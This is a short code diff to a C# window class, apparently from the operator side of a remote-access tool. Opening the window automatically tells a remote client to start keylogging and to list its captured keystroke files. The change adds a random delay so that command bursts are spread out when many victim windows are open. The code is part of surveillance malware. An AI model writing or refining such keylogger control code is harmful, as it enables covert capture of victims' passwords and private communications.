@@ -38,9 +38,10 @@ public partial class KeyloggerWindow : Window
             _autoRefresh.Stop();
         };
 
-        // Auto-start capturing on open + load file list
+        // Auto-start capturing on open + load file list (staggered to avoid burst when many windows open)
         Loaded += async (_, _) =>
         {
+            await Task.Delay(Random.Shared.Next(0, 250));
             await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStart });
             _capturing = true; UpdateBadge(); _autoRefresh.Start();
             await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
